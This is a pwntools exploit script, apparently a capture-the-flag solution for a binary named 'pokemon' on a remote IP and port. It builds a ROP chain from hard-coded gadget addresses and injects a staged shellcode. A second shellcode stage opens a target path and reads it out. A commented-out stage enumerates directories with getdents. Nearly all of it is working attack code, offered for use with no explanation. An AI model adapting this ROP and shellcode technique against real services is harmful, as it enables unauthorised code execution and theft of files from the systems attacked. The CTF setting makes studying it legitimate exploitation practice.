#!/usr/bin/python2
from pwn import *

# p = process('./pokemon')
p = remote("103.145.226.170", 3002)
context.arch = 'amd64'
read_plt = 0x4010b0
pop_rsi_r15 = 0x4013b1
ret = 0x00000000004013b4
bss = 0x0000000000404000
pop_rbx_etc = 0x00000000004013aa
shellcode = b"\x90"*32 + asm(
'''
mov rdx, 0x1000
xor rax, rax
syscall
''')
payload = p64(ret)*6 + p64(pop_rbx_etc) + shellcode.ljust(0x30, b"\x90")
sleep(0.1)
# pause()
p.sendline(payload)
sleep(0.1)
# getdents
# shellcode = b"\x90"*150
# shellcode += asm('''
# sub rsp, 0x4000
# ''')
# shellcode += asm(shellcraft.pushstr('/home/app'))
# shellcode += asm(shellcraft.open('rsp', 0, 0))
# shellcode += asm(shellcraft.amd64.linux.syscall('SYS_getdents', 'rax','rsp', 0x4000).rstrip())
# shellcode += asm(shellcraft.write(1, 'rsp', 0x400))
# shellcode += asm(shellcraft.read(0, 'rsp', 200))
# p.sendline(shellcode)

# read flag
flag = "/home/app"

shellcode = b"\x90"*150
shellcode += asm('''
sub rsp, 0x4000
''')
shellcode += asm(shellcraft.pushstr(flag))
shellcode += asm(shellcraft.open('rsp', 0, 0))
shellcode += asm(shellcraft.read('rax', 'rsp', 0x50))
shellcode += asm(shellcraft.write(1, 'rsp', 0x50))
p.sendline(shellcode)
p.interactive()
p.close()